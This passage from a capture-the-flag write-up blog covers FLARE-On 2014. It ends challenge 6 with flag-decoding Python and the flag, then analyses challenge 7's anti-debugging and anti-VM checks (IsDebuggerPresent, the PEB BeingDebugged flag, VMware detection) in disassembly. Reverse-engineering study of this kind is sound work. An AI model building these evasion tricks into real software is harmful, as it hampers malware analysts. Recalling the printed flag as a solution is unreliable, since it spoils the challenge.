</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">arg2</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0x32</span> <span class="o">^</span> <span class="mh">0xB2</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x62</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="mh">0xCD</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">arg2</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="n">rol</span> <span class="p">(</span> <span class="mh">0xEB</span> <span class="p">,</span> <span class="mh">0x07</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x73</span> <span class="o">^</span> <span class="mh">0xB7</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">arg2</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">=</span> <span class="n">rol</span> <span class="p">(</span> <span class="mh">0x0B</span> <span class="o">+</span> <span class="mh">0x4C</span> <span class="o">-</span> <span class="mh">0x5B</span> <span class="p">,</span> <span class="mh">0x36</span> <span class="p">)</span> <span class="o">+</span> <span class="mh">0x61</span> <span class="o">-</span> <span class="mh">0x34</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">arg2</span><span class="p">[</span><span class="mi">18</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x9A</span> <span class="o">-</span> <span class="mh">0x5A</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">arg2</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span> <span class="o">=</span> <span class="n">rol</span><span class="p">(</span><span class="mh">0x99</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">arg2</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0x2B</span> <span class="o">+</span> <span class="mh">0xE7</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x7E</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">arg2</span><span class="p">[</span><span class="mi">21</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span> <span class="p">(</span> <span class="n">rol</span><span class="p">(</span> <span class="n">ror</span><span class="p">(</span><span class="mh">0xAF</span><span class="p">,</span><span class="mh">0x57</span><span class="p">)</span> <span class="p">,</span> <span class="mh">0x4A</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x4E</span> <span class="p">)</span> <span class="o">^</span> <span class="mh">0x86</span> <span class="p">)</span> <span class="o">+</span> <span class="mh">0xb8</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span> <span class="nb">id</span><span class="o">=</span><span class="s">&quot;stopped-after-fla&quot;</span><span class="o">&gt;</span><span class="n">stopped</span> <span class="n">after</span> <span class="nd">@fla</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">for</span> <span class="n">index</span><span class="p">,</span> <span class="n">item</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">arg2</span><span class="p">):</span>
</span><span class='line'>    <span class="n">arg2</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="n">item</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="mh">0xFF</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="err">‘‘</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">chr</span><span class="p">,</span> <span class="n">arg2</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span> <span class="nb">id</span><span class="o">=</span><span class="s">&quot;output&quot;</span><span class="o">&gt;</span><span class="n">output</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">l1nhax</span><span class="o">.</span><span class="n">hurt</span><span class="o">.</span><span class="n">u5</span><span class="o">.</span><span class="n">a1l</span><span class="nd">@flaZZZZZZZZZZ</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Thanks <a href="https://twitter.com/Wartortell">@Wartortell</a>.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Flag 6 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>l1nhax.hurt.u5.a1l@flare-on.com</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<hr />

<h2 id="a-namech7a-challenge-7---the-doge-strikes-back"><a name="ch7"></a> Challenge 7 - The Doge Strikes Back</h2>

<p><code>
Alright! Last one, can you get to the finish line? Keep it up!
-FLARE
</code></p>

<p>By this time we have already fallen into a pre-check routine. Filename is <code>d69650fa6d4825ec2ddeecdc6a92228d</code> (MD5 hash) and googling brings up no notable results.</p>

<p>PE-Studio stuff:</p>

<ul>
  <li>Win32 executable</li>
  <li>VirusTotal score: 5/55</li>
  <li>Imported libraries: ws2_32.dll, kernel32.dll and wininet.dll. <code>wininet.dll</code> is for the interwebz</li>
  <li>Imported symbols: Lots of them. Functions for creating network sockets, hostname lookups, creating, reading and writing files and general anti-debug/anti-vm stuff</li>
  <li>Strings: Not as many strings as challenge 6. cmd.exe and 127.0.0.1 look interesting</li>
</ul>

<p>I used <code>API Monitor</code> to observe application’s API calls. It crashed after a while and API Monitor flagged 230k calls. Sifting through them is not practical but a lot of them are redundant and do not look interesting. For example there are a lot of <code>LocalAlloc</code> and <code>LocalFree</code> calls. Right click any call and select <code>Exclude &gt; API Name</code> to filter it. After excluding a lot of stuff, there was still so much crap. So instead I tried to look at API calls to certain Dlls for example <code>wininet.dll</code>. Under <code>Monitored Processes</code> navigate to <code>Modules</code> and then select a specific Dll to only see its calls. Let’s search for specific calls that we noticed in PE-Studio. API Monitor also supports searching in MSDN. Double click a call or right click and select <code>Online Help (MSDN)</code>.</p>

<p>I searched for <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms738524%28v=vs.85%29.aspx">gethostbyname</a> and found some interesting results:</p>

<p><img src="/images/2014/flare/7-1.jpg" alt="Dogecoin" title="Dogecoin" /></p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Calls for gethostbyname </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gethostbyname ( “www.dogecoin.com” )
</span><span class='line'>gethostbyname ( “e.root-servers.net” )</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>I was curious about these connections so I captured the traffic using <code>Wireshark</code> from launch to crash. </p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Traffic summary - some lines omitted </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>10.0.2.15	192.168.1.1	DNS	76	Standard query 0xbbc7  A www.dogecoin.com
</span><span class='line'>192.168.1.1	10.0.2.15	DNS	106	Standard query response 0xbbc7  CNAME dogecoin.com A 204.232.175.78
</span><span class='line'>10.0.2.15	192.168.1.1	DNS	78	Standard query 0xa75d  A e.root-servers.net
</span><span class='line'>192.168.1.1	10.0.2.15	DNS	94	Standard query response 0xa75d  A 192.203.230.10
</span><span class='line'>10.0.2.15	192.168.1.1	DNS	71	Standard query 0x7524  A twitter.com
</span><span class='line'>192.168.1.1	10.0.2.15	DNS	135	Standard query response 0x7524  A 199.16.156.198 A 199.16.156.70 A 199.16.156.6 A 199.16.156.102
</span><span class='line'>10.0.2.15	199.16.156.198	TLSv1	124	Client Hello
</span><span class='line'>199.16.156.198	10.0.2.15	TLSv1	1474	Server Hello
</span><span class='line'>199.16.156.198	10.0.2.15	TLSv1	382	Certificate
</span><span class='line'>10.0.2.15	199.16.156.198	TLSv1	368	Client Key Exchange, Change Cipher Spec, Encrypted Handshake Message
</span><span class='line'>199.16.156.198	10.0.2.15	TLSv1	101	Change Cipher Spec, Encrypted Handshake Message
</span><span class='line'>10.0.2.15	199.16.156.198	TLSv1	260	Application Data
</span><span class='line'>199.16.156.198	10.0.2.15	TLSv1	1431	Application Data
</span><span class='line'>199.16.156.198	10.0.2.15	TLSv1	1474	Application Data&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Query for <code>www.dogecoin.com</code>, <code>e.root-servers.net</code> and <code>www.twitter.com</code>. Then TLS handshake in lines 7-11 and finally a request to twitter (line 12) and reply (lines 13-14). Let’s search for “twitter” in API Monitor and we see this <code>InternetOpenUrlW ( 0x00cc0004, "https://twitter.com/FireEye/status/484033515538116608", NULL, 0, INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_PRAGMA_NOCACHE, 0 )</code>. Let’s find that tweet and it looks normal.</p>

<p><img src="/images/2014/flare/7-2.jpg" alt="When embed tweet plugins for Octopress don't work" title="When embed tweet plugins for Octopress don't work" /></p>

<p>Because this challenge employs a good number of Anti-Debug/Anti-VM protections, I will try to explain what I learned at each stage. Even after finishing the challenge I went back and looked at some steps again to learn more.</p>

<p>Here are some useful resources:</p>

<ul>
  <li>
    <p><a href="http://pferrie.host22.com/papers/antidebug.pdf">The “Ultimate” Anti-Debugging Reference (PDF)</a> by <code>Peter Ferrie</code>. I had to remind myself what year it was after I visited <a href="http://pferrie.host22.com/">his website</a></p>
  </li>
  <li>
    <p><a href="http://practicalmalwareanalysis.com/">Practical Malware Analysis book</a> chapters 16 and 17 deal with Anti-Debugging and Anti-VM techniques</p>
  </li>
  <li>
    <p><a href="https://blog.malwarebytes.org/intelligence/2014/09/five-anti-debugging-tricks-that-sometimes-fool-analysts/">Five Anti-Analysis Tricks That Sometimes Fool Analysts</a> was published when I was writing this post</p>
  </li>
</ul>

<p>Find <code>main</code> and put a breakpoint on it. As we go through main we reach a bunch of function calls. Let’s start with the first one.</p>

<h4 id="function-1---isdebuggerpresent">Function 1 - isDebuggerPresent?</h4>

<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401030</span>   <span class="c1">; you are here</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4010</span><span class="nv">C0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B1D</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401130</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B22</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4011</span><span class="nv">D0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B27</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4012</span><span class="nv">A0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B2C</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401350</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B31</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4013</span><span class="nv">F0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B36</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401460</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3B</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3D</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4014</span><span class="nv">F0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B42</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401590</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B47</span> <span class="nv">call</span>    <span class="nv">sub_4016F0</span><span class="o">&lt;/</span><span class="nv">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p><img src="/images/2014/flare/7-3.jpg" alt="isDebuggerPresent" title="isDebuggerPresent" /></p>

<p>The result of a function call <code>isDebuggerPresent</code> is compared with 0 by <code>test eax, eax</code>. This function will return 1 if the application is being debugged. In our case it will return 1 and the jump fails. Before the compare we see a value <code>0x106240</code> or <code>1073728</code> is loaded into <code>esi</code>. On both sides we see a string being loaded and then we enter a loop. If we step through the loop and look at the xor line, we can see that it is xor-ing <code>oh happy dayz</code> with the data at <code>byte_4131F8</code>. If we reach the end of the string it will restart from the first character. This loop will go on for <code>1073728</code> bytes which seems to be length of data starting at <code>byte_4131F8</code>. I am going to rename it to <code>blob</code> and the number <code>0x106240</code> to <code>blob_length</code>.</p>

<p>If debugger is present, we go left and the string <code>oh happy dayz</code> is xor-ed with the blob. If no debugger is present, we jump to the right branch and string <code>the final countdown</code> is xor-ed with the <code>blob</code>.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>isDebuggerPresent </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">isDebuggerPresent</span><span class="p">):</span>
</span><span class='line'>    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="err">”</span><span class="n">oh</span> <span class="n">happy</span> <span class="n">dayz</span><span class="err">”</span><span class="p">)</span>
</span><span class='line'><span class="k">else</span><span class="p">:</span>
</span><span class='line'>    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="err">”</span><span class="n">the</span> <span class="n">final</span> <span class="n">countdown</span><span class="err">”</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h4 id="function-2---beingdebugged">Function 2 - BeingDebugged?</h4>

<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">isDebuggerPresent</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4010</span><span class="nv">C0</span>    <span class="c1">; you are here</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B1D</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401130</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B22</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4011</span><span class="nv">D0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B27</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4012</span><span class="nv">A0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B2C</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401350</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B31</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4013</span><span class="nv">F0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B36</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401460</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3B</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B3D</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4014</span><span class="nv">F0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B42</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401590</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B47</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4016</span><span class="nv">F0</span><span class="o">&lt;/</span><span class="nv">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="err">&lt;</span><span class="nf">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Let’s forget about the first compare and look at the outcome. Something is being compared with 1. If the compare succeeds then the first jump happens and we skip reseting <code>var_4</code> to zero. The next jump will only happen if <code>var_4</code> is zero which means that the last jump should not have happened. If the first compare succeeds (meaning <code>[eax+2]</code> is 1) then we go left and otherwise right.</p>

<p><img src="/images/2014/flare/7-4.jpg" alt="BeingDebugged" title="BeingDebugged" /></p>

<p>In both cases a string <code>UNACCEPTABLE!</code> or <code>omglob</code> are loaded along with address <code>byte_4131F8</code> before a function call <code>sub_401000</code>. The address points to a long stream of data.</p>

<p><img src="/images/2014/flare/7-5.jpg" alt="blob" title="blob" /></p>

<p>Looking inside <code>sub_401000</code>. At the start <code>blob_length</code> is loaded into <code>ecx</code>. Then we enter a loop. If we step through the loop and look at the xor line, we can see that it is xor-ing <code>UNACCEPTABLE!</code> with the data at <code>byte_4131F8</code>. If we reach the end of the string it will restart from the first character. This loop will go on for <code>1073728</code> bytes which seems to be length of data starting at <code>byte_4131F8</code>. So <code>sub_401000</code> is <code>string xor blob</code>.</p>

<p><img src="/images/2014/flare/7-6.jpg" alt="xor function" title="xor function" /></p>

<p>Now let’s go back to the first compare.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="nl">.text:</span><span class="err">004010</span><span class="nf">C6</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_4</span><span class="p">],</span> <span class="mi">1</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004010</span><span class="nf">CD</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="nv">large</span> <span class="nb">fs</span><span class="p">:</span><span class="mh">30h</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">004010</span><span class="nf">D3</span> <span class="nv">cmp</span>     <span class="kt">byte</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">eax</span><span class="o">+</span><span class="mi">2</span><span class="p">],</span> <span class="mi">1</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>What is the significance of <code>fs:30h</code>? It is the <code>Process Environment Block (PEB)</code> in the <code>Thread Information Block (TIB)</code>. According to <a href="http://msdn.microsoft.com/en-gb/library/windows/desktop/aa813706%28v=vs.85%29.aspx">MSDN</a> it has the following structure. The application is comparing the 3rd byte with 1. The 3rd byte is called <code>BeingDebugged</code> and is set to 1 if the application is being debugged. If we are running the application with a debugger it will be set to 1 and <code>UNACCEPTABLE!</code> will be xor-ed with the <code>blob</code> otherwise <code>omglob</code>. More information about the <code>PEB</code> can be found in the first section of the PDF <code>1.NtGlobalFlag</code>.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>PEB Structure </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_PEB</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">BYTE</span>                          <span class="n">Reserved1</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span><span class='line'>  <span class="n">BYTE</span>                          <span class="n">BeingDebugged</span><span class="p">;</span>
</span><span class='line'>  <span class="n">BYTE</span>                          <span class="n">Reserved2</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span><span class='line'>  <span class="n">PVOID</span>                         <span class="n">Reserved3</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span><span class='line'>  <span class="n">PPEB_LDR_DATA</span>                 <span class="n">Ldr</span><span class="p">;</span>
</span><span class='line'>  <span class="n">PRTL_USER_PROCESS_PARAMETERS</span>  <span class="n">ProcessParameters</span><span class="p">;</span>
</span><span class='line'>  <span class="n">BYTE</span>                          <span class="n">Reserved4</span><span class="p">[</span><span class="mi">104</span><span class="p">];</span>
</span><span class='line'>  <span class="n">PVOID</span>                         <span class="n">Reserved5</span><span class="p">[</span><span class="mi">52</span><span class="p">];</span>
</span><span class='line'>  <span class="n">PPS_POST_PROCESS_INIT_ROUTINE</span> <span class="n">PostProcessInitRoutine</span><span class="p">;</span>
</span><span class='line'>  <span class="n">BYTE</span>                          <span class="n">Reserved6</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
</span><span class='line'>  <span class="n">PVOID</span>                         <span class="n">Reserved7</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span><span class='line'>  <span class="n">ULONG</span>                         <span class="n">SessionId</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span> <span class="n">PEB</span><span class="p">,</span> <span class="o">*</span><span class="n">PPEB</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>At this point we can rewrite this function in Python</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>BeingDebugged </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">BeingDebugged</span><span class="p">):</span>
</span><span class='line'>    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="err">”</span><span class="n">UNACCEPTBALE</span><span class="err">!”</span><span class="p">)</span>
</span><span class='line'><span class="k">else</span><span class="p">:</span>
</span><span class='line'>    <span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="err">”</span><span class="n">omglob</span><span class="err">”</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<h4 id="function-3---vmware-detection-via-red-pill">Function 3 - VMware Detection via Red Pill</h4>

<p><div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='nasm'><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">isDebuggerPresent</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B13</span> <span class="nv">call</span>    <span class="nv">calls_isDebuggerPresent</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B18</span> <span class="nv">call</span>    <span class="nv">BeingDebugged</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B1D</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">401130</span>       <span class="c1">; you are here</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B22</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4011</span><span class="nv">D0</span>
</span><span class='line'><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B27</span> <span class="nv">call</span>    <span class="nv">sub</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4012</span><span class="nv">A0</span>
